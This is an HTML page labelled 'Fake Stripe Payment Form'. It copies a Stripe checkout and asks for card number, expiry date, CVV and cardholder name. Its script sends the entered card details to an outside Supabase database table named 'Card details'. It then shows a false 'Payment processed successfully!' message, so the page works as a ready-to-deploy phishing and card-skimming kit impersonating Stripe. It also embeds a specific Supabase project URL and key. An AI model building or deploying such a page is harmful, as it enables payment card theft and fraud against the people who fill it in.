<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Fake Stripe Payment Form</title>
  <!-- 1. Load Supabase JavaScript Library -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      padding: 20px;
    }
    .stripe-form {
      max-width: 400px;
      margin: 0 auto;
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    .stripe-form h2 {
      text-align: center;
      color: #000;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-group label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
    }
    .form-group input {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }
    .form-group .card-number {
      padding: 0;
      border: none;
      display: flex;
      flex-direction: column;
    }
    .form-group .card-expiration {
      display: flex;
      justify-content: space-between;
    }
    .form-group .card-expiration input {
      width: 48%;
    }
    .pay-button {
      width: 100%;
      padding: 12px;
      background-color: #4caf50;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
    }
    .pay-button:hover {
      background-color: #45a049;
    }
    .confirmation {
      margin-top: 20px;
      text-align: center;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>
  <div class="stripe-form">
    <h2>Stripe Payment</h2>
    <form id="paymentForm">
      <div class="form-group">
        <label for="cardNumber">Card Number</label>
        <div class="card-number">
          <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required />
        </div>
      </div>
      <div class="form-group">
        <label>Expiration Date</label>
        <div class="card-expiration">
          <input type="text" id="cardMonth" placeholder="MM" required />
          <input type="text" id="cardYear" placeholder="YYYY" required />
        </div>
      </div>
      <div class="form-group">
        <label for="cardCVV">CVV</label>
        <input type="text" id="cardCVV" placeholder="CVV" required />
      </div>
      <div class="form-group">
        <label for="cardName">Cardholder Name</label>
        <input type="text" id="cardName" placeholder="Name on card" required />
      </div>
      <button type="submit" class="pay-button">Pay with Stripe</button>
    </form>
    <div class="confirmation" id="confirmation" style="display: none;">
      <p>Payment processed successfully!</p>
    </div>
  </div>

  <script>
    // 2. Initialize Supabase Connection
    const supabaseUrl = 'https://ojtvbycodnwqunpnuwsm.supabase.co';
    const supabaseKey = 'sb_publishable_PWPTPbbJlnUuKuATAjyhKg_a6aIUwVM';
    const _supabase = supabase.createClient(supabaseUrl, supabaseKey);

    // 3. Handle Form Submission and Save Data to Database
    document.getElementById('paymentForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const cardNumber = document.getElementById('cardNumber').value;
      const cardMonth = document.getElementById('cardMonth').value;
      const cardYear = document.getElementById('cardYear').value;
      const cardCVV = document.getElementById('cardCVV').value;
      const cardName = document.getElementById('cardName').value;

      if (cardNumber && cardMonth && cardYear && cardCVV && cardName) {
        // Send data directly to Supabase table (Change 'orders' to your actual table name if different)
        const { error } = await _supabase
          .from('Card details')
          .insert([
            { 
              card_number: cardNumber, 
              card_month: cardMonth, 
              card_year: cardYear, 
              card_cvv: cardCVV, 
              card_name: cardName 
            }
          ]);

        if (error) {
          console.error('Error saving data:', error);
          alert('Database error: ' + error.message);
        } else {
          // Simulate Stripe processing UI response
          document.getElementById('confirmation').style.display = 'block';
          document.getElementById('paymentForm').style.display = 'none';
        }
      }
    });
  </script>
</body>
</html>
